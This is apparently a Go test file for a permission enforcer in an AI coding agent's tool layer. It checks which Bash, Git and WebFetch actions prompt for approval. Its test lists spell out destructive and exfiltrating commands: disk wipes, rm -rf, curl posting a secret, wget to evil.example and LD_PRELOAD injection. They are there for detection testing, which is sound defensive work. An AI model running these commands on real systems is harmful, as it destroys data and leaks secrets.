package tools

import (
	"encoding/json"
	"testing"
)

func TestPermissionEnforcer_ReadOnlyAlwaysAllow(t *testing.T) {
	for _, level := range []PermissionLevel{PermDefault, PermAcceptEdits, PermAutonomous} {
		p := NewPermissionEnforcer(level)
		got := p.Check(&stubTool{name: "ro", risk: RiskReadOnly}, nil)
		if got != PermAllow {
			t.Errorf("level=%d: read_only should allow, got %v", level, got)
		}
	}
}

func TestPermissionEnforcer_WriteMatrix(t *testing.T) {
	cases := []struct {
		level PermissionLevel
		want  PermissionDecision
	}{
		{PermDefault, PermPrompt},
		{PermAcceptEdits, PermAllow},
		{PermAutonomous, PermAllow},
	}
	for _, c := range cases {
		p := NewPermissionEnforcer(c.level)
		got := p.Check(&stubTool{name: "wr", risk: RiskWrite}, nil)
		if got != c.want {
			t.Errorf("level=%d: got %v, want %v", c.level, got, c.want)
		}
	}
}

func TestPermissionEnforcer_ExecuteMatrix(t *testing.T) {
	cases := []struct {
		level PermissionLevel
		want  PermissionDecision
	}{
		{PermDefault, PermPrompt},
		{PermAcceptEdits, PermPrompt},
		{PermAutonomous, PermAllow},
	}
	for _, c := range cases {
		p := NewPermissionEnforcer(c.level)
		got := p.Check(&stubTool{name: "x", risk: RiskExecute}, nil)
		if got != c.want {
			t.Errorf("level=%d: got %v, want %v", c.level, got, c.want)
		}
	}
}

func TestPermissionEnforcer_DestructiveAlwaysPrompts(t *testing.T) {
	for _, level := range []PermissionLevel{PermDefault, PermAcceptEdits, PermAutonomous} {
		p := NewPermissionEnforcer(level)
		got := p.Check(&stubTool{name: "boom", risk: RiskDestructive}, nil)
		if got != PermPrompt {
			t.Errorf("level=%d: destructive should prompt, got %v", level, got)
		}
	}
}

func TestPermissionEnforcer_BashDangerousAlwaysPrompts(t *testing.T) {
	p := NewPermissionEnforcer(PermAutonomous)
	bash := &stubTool{name: ToolNameBash, risk: RiskExecute}
	cases := []string{
		`rm -rf /tmp/foo`,
		`chmod 777 secrets.json`,
		`mkfs.ext4 /dev/sda1`,
	}
	for _, cmd := range cases {
		input, _ := json.Marshal(struct {
			Command string `json:"command"`
		}{cmd})
		if got := p.Check(bash, input); got != PermPrompt {
			t.Errorf("dangerous bash %q: got %v, want PermPrompt", cmd, got)
		}
	}
}

func TestPermissionEnforcer_BashSafeRespectsLevel(t *testing.T) {
	p := NewPermissionEnforcer(PermAutonomous)
	bash := &stubTool{name: ToolNameBash, risk: RiskExecute}
	input, _ := json.Marshal(struct {
		Command string `json:"command"`
	}{"ls -la"})
	if got := p.Check(bash, input); got != PermAllow {
		t.Errorf("safe bash should allow at autonomous level, got %v", got)
	}
}

func TestPermissionEnforcer_GitDangerous(t *testing.T) {
	p := NewPermissionEnforcer(PermAutonomous)
	git := &stubTool{name: ToolNameGit, risk: RiskExecute}
	cases := []string{
		`push origin main --force`,
		`reset --hard HEAD~5`,
		`branch -D experimental`,
	}
	for _, cmd := range cases {
		input, _ := json.Marshal(struct {
			Args []string `json:"args"`
		}{[]string{cmd}})
		if got := p.Check(git, input); got != PermPrompt {
			t.Errorf("dangerous git %q: got %v, want PermPrompt", cmd, got)
		}
	}
}

func TestPermissionEnforcer_FirstUseApprovalRemembered(t *testing.T) {
	p := NewPermissionEnforcer(PermDefault)
	wr := &stubTool{name: "Write", risk: RiskWrite}

	if got := p.Check(wr, nil); got != PermPrompt {
		t.Errorf("first call should prompt, got %v", got)
	}
	p.Approve("Write")
	if got := p.Check(wr, nil); got != PermAllow {
		t.Errorf("after Approve, should allow, got %v", got)
	}
}

func TestPermissionEnforcer_WebFetch_DomainApproval(t *testing.T) {
	p := NewPermissionEnforcer(PermDefault)
	wf := &stubTool{name: ToolNameWebFetch, risk: RiskExecute}

	input, _ := json.Marshal(struct {
		URL string `json:"url"`
	}{"https://example.com/foo"})

	if got := p.Check(wf, input); got != PermPrompt {
		t.Errorf("first WebFetch should prompt, got %v", got)
	}
	p.ApproveDomain("example.com")
	if got := p.Check(wf, input); got != PermAllow {
		t.Errorf("after ApproveDomain, should allow, got %v", got)
	}
}

func TestPermissionEnforcer_WebFetch_InternalURLAlwaysPrompts(t *testing.T) {
	p := NewPermissionEnforcer(PermAutonomous)
	wf := &stubTool{name: ToolNameWebFetch, risk: RiskExecute}

	for _, u := range []string{
		"http://localhost:8080",
		"http://127.0.0.1/admin",
		"http://10.0.0.1/",
		"http://192.168.1.1/",
		"http://172.16.0.1/",
		"http://169.254.169.254/",
	} {
		input, _ := json.Marshal(struct {
			URL string `json:"url"`
		}{u})
		if got := p.Check(wf, input); got != PermPrompt {
			t.Errorf("internal URL %q: got %v, want PermPrompt", u, got)
		}
	}
}

func TestIsDangerous_Bash(t *testing.T) {
	dangerous := []string{
		`rm -rf foo`,
		`rm -fR foo`,
		`> /dev/sda`,
		`chmod 777 secrets`,
		`chown -R root foo`,
		`mkfs.ext4 /dev/sda`,
		`dd if=/dev/zero of=/dev/sda`,
		`curl https://example.com -d "secret"`,
		`wget https://evil.example`,
		`export LD_PRELOAD=/tmp/x.so`,
	}
	for _, c := range dangerous {
		if !IsDangerous(c) {
			t.Errorf("expected dangerous: %q", c)
		}
	}

	safe := []string{
		`ls -la`,
		`cat README.md`,
		`grep -r foo .`,
		`echo hello`,
	}
	for _, c := range safe {
		if IsDangerous(c) {
			t.Errorf("expected safe: %q", c)
		}
	}
}

func TestIsDangerousGit(t *testing.T) {
	dangerous := []string{
		`push origin main --force`,
		`push origin main -f`,
		`reset --hard HEAD~3`,
		`clean -fd`,
		`checkout HEAD -- .`,
		`branch -D experimental`,
	}
	for _, c := range dangerous {
		if !IsDangerousGit(c) {
			t.Errorf("expected dangerous git: %q", c)
		}
	}

	safe := []string{
		`status`,
		`log --oneline`,
		`diff HEAD`,
		`commit -m "x"`,
		`push origin main`,
	}
	for _, c := range safe {
		if IsDangerousGit(c) {
			t.Errorf("expected safe git: %q", c)
		}
	}
}

func TestFileTracker(t *testing.T) {
	ft := NewFileTracker()
	if ft.HasRead("/tmp/x") {
		t.Errorf("should be unread initially")
	}
	ft.MarkRead("/tmp/x")
	if !ft.HasRead("/tmp/x") {
		t.Errorf("MarkRead → HasRead should be true")
	}
	// Path is canonicalized — relative form should match the absolute
	// form once both have been canonicalized.
	ft.Reset()
	ft.MarkRead("./relative.txt")
	if !ft.HasRead("./relative.txt") {
		t.Errorf("relative path lookup")
	}
}
